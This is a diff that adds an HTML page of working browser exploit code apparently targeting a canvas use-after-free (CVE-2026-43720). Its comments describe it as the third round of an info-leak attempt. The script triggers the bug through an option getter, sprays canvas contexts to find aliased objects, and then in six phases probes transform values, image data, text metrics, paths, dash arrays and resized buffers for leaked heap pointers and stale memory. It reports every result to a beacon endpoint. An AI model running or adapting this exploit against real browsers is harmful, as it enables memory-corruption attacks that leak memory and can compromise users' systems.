@@ -1,0 +1,471 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635g</title></head>
+<body><pre id="out">p635g: Canvas UAF — safe adjacent + putImageData + measureText + path</pre>
+<script>
+'use strict';
+/*
+  p635g: CVE-2026-43720 info leak — round 3
+  -- prior art: p635f Phase B crashed (100 deep saves). Remove deep saves.
+  -- prior art: p635f Phases C/D never ran. Include them here.
+  -- prior art: p635e shadows DO alias, gradient/pattern opaque, pixels clean
+
+  CRASH_CLASS: MODERATE — no deep state stack manipulation
+
+  Strategy:
+  A) Safe adjacent context: 2 UAFs, spray, write extreme doubles to lo ctx
+     (NO deep saves), read hi ctx for overlap/pointer leak
+  B) putImageData confusion: write through alias, read through inner
+  C) measureText side channel: set font through alias to trigger font loading,
+     measureText through inner — width differences may reveal internal state
+  D) isPointInPath/isPointInStroke: build path through alias, test through inner
+     If path objects have internal pointers, confused dispatch may leak addresses
+  E) setLineDash array: set dash pattern through alias, getLineDash through inner
+     The dash array is a separate heap allocation — may leak its address
+  F) Canvas backing buffer size probe: resize canvas through alias after UAF,
+     read pixels from inner — may get stale/uninitialized backing buffer data
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635G-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635g', msg:msg, level:'info', sid:'p635g-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+bk('START', navigator.userAgent);
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false;
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var hi = new Uint32Array(buf)[1];
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF);
+}
+
+function triggerUAF() {
+  var inner = null;
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { cv.getContext('bitmaprenderer', opts); } catch(e) {}
+  return {inner: inner, canvas: cv};
+}
+
+var tc = document.createElement('canvas');
+if (!tc.getContext('bitmaprenderer')) { bk('DEAD', 'no bmr'); throw new Error('no bmr'); }
+bk('P0', 'bmr OK');
+tc = null;
+
+// ================================================================
+// PHASE A: Safe adjacent context overlap (no deep saves)
+// ================================================================
+bk('A-START', 'safe adjacent');
+var uaf1 = triggerUAF();
+var uaf2 = triggerUAF();
+if (!uaf1.inner || !uaf2.inner) {
+  bk('A-FAIL', 'inner1=' + !!uaf1.inner + ' inner2=' + !!uaf2.inner);
+} else {
+  var sprayA = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayA.push(ctx);
+  }
+
+  var S1 = 1234.5;
+  try { uaf1.inner.lineWidth = S1; } catch(e) {}
+  var a1 = -1;
+  for (var i = 0; i < sprayA.length; i++) {
+    if (sprayA[i].lineWidth === S1) { a1 = i; break; }
+  }
+
+  var S2 = 5678.5;
+  try { uaf2.inner.lineWidth = S2; } catch(e) {}
+  var a2 = -1;
+  for (var i = 0; i < sprayA.length; i++) {
+    if (sprayA[i].lineWidth === S2) { a2 = i; break; }
+  }
+
+  bk('A-ALIASES', 'i1=spray[' + a1 + '] i2=spray[' + a2 + '] gap=' + Math.abs(a2 - a1));
+
+  if (a1 >= 0 && a2 >= 0 && a1 !== a2) {
+    var lo = a1 < a2 ? a1 : a2;
+    var hi = a1 < a2 ? a2 : a1;
+    var loInner = a1 < a2 ? uaf1.inner : uaf2.inner;
+    var hiInner = a1 < a2 ? uaf2.inner : uaf1.inner;
+
+    // Record hi defaults
+    var hiDef = {};
+    try { hiDef.lw = hiInner.lineWidth; } catch(e) {}
+    try { hiDef.ml = hiInner.miterLimit; } catch(e) {}
+    try { var t = hiInner.getTransform(); hiDef.txa = t.a; } catch(e) {}
+
+    // Write extreme values to lo (no deep saves)
+    loInner.setTransform(1e300, 2e300, 3e300, 4e300, 5e300, 6e300);
+    loInner.lineWidth = 1e308;
+    loInner.miterLimit = 1.5e308;
+    loInner.shadowBlur = 1e100;
+    loInner.shadowOffsetX = 2e100;
+    loInner.shadowOffsetY = 3e100;
+    loInner.lineDashOffset = 4e100;
+    bk('A-LO-EXTREME', 'wrote extreme doubles');
+
+    // Read hi
+    var hiAfter = {};
+    try { hiAfter.lw = hiInner.lineWidth; } catch(e) { hiAfter.lw = 'E'; }
+    try { hiAfter.ml = hiInner.miterLimit; } catch(e) { hiAfter.ml = 'E'; }
+    try { hiAfter.ga = hiInner.globalAlpha; } catch(e) { hiAfter.ga = 'E'; }
+    try { hiAfter.sb = hiInner.shadowBlur; } catch(e) { hiAfter.sb = 'E'; }
+    try { hiAfter.sox = hiInner.shadowOffsetX; } catch(e) { hiAfter.sox = 'E'; }
+    try { hiAfter.soy = hiInner.shadowOffsetY; } catch(e) { hiAfter.soy = 'E'; }
+    try { hiAfter.ldo = hiInner.lineDashOffset; } catch(e) { hiAfter.ldo = 'E'; }
+    try {
+      var t2 = hiInner.getTransform();
+      hiAfter.txa = t2.a; hiAfter.txb = t2.b; hiAfter.txc = t2.c; hiAfter.txd = t2.d;
+    } catch(e) { hiAfter.tx = 'E'; }
+    bk('A-HI-READ', JSON.stringify(hiAfter));
+
+    var changed = [];
+    if (hiAfter.lw !== hiDef.lw) changed.push('lw');
+    if (hiAfter.ml !== hiDef.ml) changed.push('ml');
+    if (hiAfter.txa !== hiDef.txa) changed.push('txa');
+    bk('A-CHANGES', changed.length > 0 ? 'OVERLAP: ' + changed.join(',') : 'NONE');
+
+    // Hex dump
+    var pf = ['lw','ml','ga','sb','sox','soy','ldo','txa','txb','txc','txd'];
+    var hx = [];
+    for (var i = 0; i < pf.length; i++) {
+      var v = hiAfter[pf[i]];
+      if (typeof v === 'number') {
+        hx.push(pf[i] + '=' + f64hex(v));
+        if (isPointerLike(v)) hx.push('PTR!');
+      }
+    }
+    bk('A-HEX', hx.join(' '));
+  }
+}
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: putImageData confusion
+// ================================================================
+bk('B-START', 'putImageData');
+var uafB = triggerUAF();
+if (!uafB.inner) {
+  bk('B-FAIL', 'no inner');
+} else {
+  var sprayB = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayB.push({ctx: ctx, canvas: c});
+  }
+  var SENTB = 7777.5;
+  try { uafB.inner.lineWidth = SENTB; } catch(e) {}
+  var aliasB = -1;
+  for (var i = 0; i < sprayB.length; i++) {
+    if (sprayB[i].ctx.lineWidth === SENTB) { aliasB = i; break; }
+  }
+  bk('B-ALIAS', aliasB >= 0 ? 'spray[' + aliasB + ']' : 'NONE');
+
+  if (aliasB >= 0) {
+    try {
+      var imgd = new ImageData(64, 64);
+      for (var i = 0; i < imgd.data.length; i += 4) {
+        imgd.data[i] = 0xDE; imgd.data[i+1] = 0xAD;
+        imgd.data[i+2] = 0xBE; imgd.data[i+3] = 0xEF;
+      }
+      sprayB[aliasB].ctx.putImageData(imgd, 0, 0);
+      var rb = uafB.inner.getImageData(0, 0, 64, 64);
+      var mismatch = 0;
+      var firstMM = '';
+      for (var i = 0; i < rb.data.length; i += 4) {
+        if (rb.data[i] !== 0xDE || rb.data[i+1] !== 0xAD ||
+            rb.data[i+2] !== 0xBE || rb.data[i+3] !== 0xEF) {
+          mismatch++;
+          if (!firstMM) firstMM = 'px[' + (i/4) + ']=' + rb.data[i] + ',' + rb.data[i+1] + ',' + rb.data[i+2] + ',' + rb.data[i+3];
+        }
+      }
+      bk('B-READ', 'mismatch=' + mismatch + '/' + (rb.data.length/4) + (firstMM ? ' ' + firstMM : ''));
+    } catch(e) { bk('B-ERR', e.message.slice(0,60)); }
+  }
+}
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: measureText side channel
+// ================================================================
+bk('C-START', 'measureText');
+var uafC = triggerUAF();
+if (!uafC.inner) {
+  bk('C-FAIL', 'no inner');
+} else {
+  var sprayC = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayC.push(ctx);
+  }
+  var SENTC = 4444.5;
+  try { uafC.inner.lineWidth = SENTC; } catch(e) {}
+  var aliasC = -1;
+  for (var i = 0; i < sprayC.length; i++) {
+    if (sprayC[i].lineWidth === SENTC) { aliasC = i; break; }
+  }
+  bk('C-ALIAS', aliasC >= 0 ? 'spray[' + aliasC + ']' : 'NONE');
+
+  if (aliasC >= 0) {
+    var ac = sprayC[aliasC];
+    // Set font through alias
+    ac.font = '48px serif';
+    // measureText through inner
+    try {
+      var m1 = uafC.inner.measureText('ABCDEFGHIJ');
+      bk('C-MT1', 'width=' + f64hex(m1.width) + '(' + m1.width + ')');
+      if (isPointerLike(m1.width)) bk('C-PTR', 'width POINTER-LIKE');
+      // Check all TextMetrics properties
+      var props = ['actualBoundingBoxAscent','actualBoundingBoxDescent',
+                   'actualBoundingBoxLeft','actualBoundingBoxRight',
+                   'fontBoundingBoxAscent','fontBoundingBoxDescent',
+                   'alphabeticBaseline','ideographicBaseline','hangingBaseline',
+                   'emHeightAscent','emHeightDescent'];
+      var mdata = [];
+      for (var i = 0; i < props.length; i++) {
+        try {
+          var v = m1[props[i]];
+          if (v !== undefined && v !== 0) {
+            mdata.push(props[i].slice(0,8) + '=' + f64hex(v));
+            if (isPointerLike(v)) mdata.push('PTR!');
+          }
+        } catch(e) {}
+      }
+      bk('C-METRICS', mdata.length > 0 ? mdata.join(' ') : 'no extra metrics');
+    } catch(e) { bk('C-MT1', 'ERR:' + e.message.slice(0,40)); }
+
+    // Try unusual font strings that might confuse the parser
+    var fonts = ['999999px a]]]', '0px', '-1px serif', '48px "\\x00"'];
+    for (var i = 0; i < fonts.length; i++) {
+      try {
+        ac.font = fonts[i];
+        var m = uafC.inner.measureText('X');
+        bk('C-FONT-' + i, 'font="' + fonts[i].slice(0,20) + '" w=' + m.width + ' f=' + uafC.inner.font);
+      } catch(e) {}
+    }
+  }
+}
+bk('C-DONE', 'survived');
+
+// ================================================================
+// PHASE D: isPointInPath / isPointInStroke
+// ================================================================
+bk('D-START', 'path confusion');
+var uafD = triggerUAF();
+if (!uafD.inner) {
+  bk('D-FAIL', 'no inner');
+} else {
+  var sprayD = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayD.push(ctx);
+  }
+  var SENTD = 2222.5;
+  try { uafD.inner.lineWidth = SENTD; } catch(e) {}
+  var aliasD = -1;
+  for (var i = 0; i < sprayD.length; i++) {
+    if (sprayD[i].lineWidth === SENTD) { aliasD = i; break; }
+  }
+  bk('D-ALIAS', aliasD >= 0 ? 'spray[' + aliasD + ']' : 'NONE');
+
+  if (aliasD >= 0) {
+    var ad = sprayD[aliasD];
+    // Build path through alias
+    ad.beginPath();
+    ad.rect(10, 10, 40, 40);
+    // Test through inner
+    try {
+      var inPath = uafD.inner.isPointInPath(20, 20);
+      var inStroke = uafD.inner.isPointInStroke(10, 10);
+      bk('D-TEST', 'inPath(20,20)=' + inPath + ' inStroke(10,10)=' + inStroke);
+    } catch(e) {
+      bk('D-TEST', 'ERR:' + e.message.slice(0,40));
+    }
+
+    // Build complex path with many points through alias
+    ad.beginPath();
+    for (var i = 0; i < 1000; i++) {
+      ad.lineTo(Math.sin(i) * 30 + 32, Math.cos(i) * 30 + 32);
+    }
+    ad.closePath();
+    // isPointInPath triggers path computation — may expose internal state
+    try {
+      var results = [];
+      for (var x = 0; x < 64; x += 8) {
+        var r = uafD.inner.isPointInPath(x, 32);
+        results.push(r ? '1' : '0');
+      }
+      bk('D-COMPLEX', 'row=' + results.join(''));
+    } catch(e) {
+      bk('D-COMPLEX', 'ERR:' + e.message.slice(0,40));
+    }
+  }
+}
+bk('D-DONE', 'survived');
+
+// ================================================================
+// PHASE E: setLineDash / getLineDash array
+// ================================================================
+bk('E-START', 'lineDash array');
+var uafE = triggerUAF();
+if (!uafE.inner) {
+  bk('E-FAIL', 'no inner');
+} else {
+  var sprayE = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayE.push(ctx);
+  }
+  var SENTE = 6666.5;
+  try { uafE.inner.lineWidth = SENTE; } catch(e) {}
+  var aliasE = -1;
+  for (var i = 0; i < sprayE.length; i++) {
+    if (sprayE[i].lineWidth === SENTE) { aliasE = i; break; }
+  }
+  bk('E-ALIAS', aliasE >= 0 ? 'spray[' + aliasE + ']' : 'NONE');
+
+  if (aliasE >= 0) {
+    var ae = sprayE[aliasE];
+    // Set large dash array through alias
+    var dashArr = [];
+    for (var i = 0; i < 100; i++) dashArr.push(i + 0.5);
+    ae.setLineDash(dashArr);
+    bk('E-SET', 'setLineDash 100 elements through alias');
+
+    // Read through inner
+    try {
+      var rd = uafE.inner.getLineDash();
+      bk('E-GET', 'len=' + rd.length);
+      if (rd.length !== dashArr.length) {
+        bk('E-MISMATCH', 'expected ' + dashArr.length + ' got ' + rd.length);
+      }
+      // Check for unexpected values
+      var anomalies = [];
+      for (var i = 0; i < rd.length; i++) {
+        if (rd[i] !== dashArr[i]) {
+          anomalies.push('[' + i + ']=' + f64hex(rd[i]) + '(exp ' + dashArr[i] + ')');
+          if (isPointerLike(rd[i])) anomalies.push('PTR!');
+        }
+      }
+      bk('E-CHECK', anomalies.length > 0 ? anomalies.join(' ') : 'all match');
+
+      // Now: set dash through inner, read through alias
+      var dash2 = [11.11, 22.22, 33.33];
+      uafE.inner.setLineDash(dash2);
+      var rd2 = ae.getLineDash();
+      bk('E-REV', 'inner set [11,22,33] alias reads len=' + rd2.length +
+         (rd2.length > 0 ? ' [0]=' + rd2[0] : ''));
+    } catch(e) {
+      bk('E-ERR', e.message.slice(0,60));
+    }
+  }
+}
+bk('E-DONE', 'survived');
+
+// ================================================================
+// PHASE F: Canvas resize after UAF — stale backing buffer
+// ================================================================
+bk('F-START', 'canvas resize stale buffer');
+var uafF = triggerUAF();
+if (!uafF.inner) {
+  bk('F-FAIL', 'no inner');
+} else {
+  var sprayF = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayF.push({ctx: ctx, canvas: c});
+  }
+  var SENTF = 8888.5;
+  try { uafF.inner.lineWidth = SENTF; } catch(e) {}
+  var aliasF = -1;
+  for (var i = 0; i < sprayF.length; i++) {
+    if (sprayF[i].ctx.lineWidth === SENTF) { aliasF = i; break; }
+  }
+  bk('F-ALIAS', aliasF >= 0 ? 'spray[' + aliasF + ']' : 'NONE');
+
+  if (aliasF >= 0) {
+    // Draw pattern on alias canvas
+    sprayF[aliasF].ctx.fillStyle = '#ff0000';
+    sprayF[aliasF].ctx.fillRect(0, 0, 64, 64);
+
+    // Resize alias canvas — this should reallocate the backing buffer
+    sprayF[aliasF].canvas.width = 256;
+    sprayF[aliasF].canvas.height = 256;
+
+    // Read pixels from the resized canvas through inner
+    // The new backing buffer may contain uninitialized heap data
+    try {
+      var px = uafF.inner.getImageData(0, 0, 256, 256);
+      var nonzero = 0;
+      var ptrBytes = [];
+      for (var i = 0; i < px.data.length; i += 4) {
+        if (px.data[i] !== 0 || px.data[i+1] !== 0 || px.data[i+2] !== 0 || px.data[i+3] !== 0) {
+          nonzero++;
+          if (ptrBytes.length < 10) {
+            ptrBytes.push('px[' + (i/4) + ']=' + px.data[i] + ',' + px.data[i+1] + ',' + px.data[i+2] + ',' + px.data[i+3]);
+          }
+        }
+      }
+      bk('F-PIXELS', 'nonzero=' + nonzero + '/' + (px.data.length/4));
+      if (ptrBytes.length > 0) bk('F-NONZERO', ptrBytes.join(' '));
+
+      // Check for pointer-like patterns in the pixel data (read as float64)
+      var abuf = px.data.buffer;
+      var fv = new Float64Array(abuf);
+      var ptrs = [];
+      for (var i = 0; i < fv.length; i++) {
+        if (isPointerLike(fv[i])) {
+          ptrs.push('[' + i + ']=' + f64hex(fv[i]));
+          if (ptrs.length >= 5) break;
+        }
+      }
+      bk('F-PTR-SCAN', ptrs.length > 0 ? ptrs.join(' ') : 'no pointer-like f64 in pixels');
+    } catch(e) {
+      bk('F-ERR', e.message.slice(0,60));
+    }
+  }
+}
+bk('F-DONE', 'survived');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
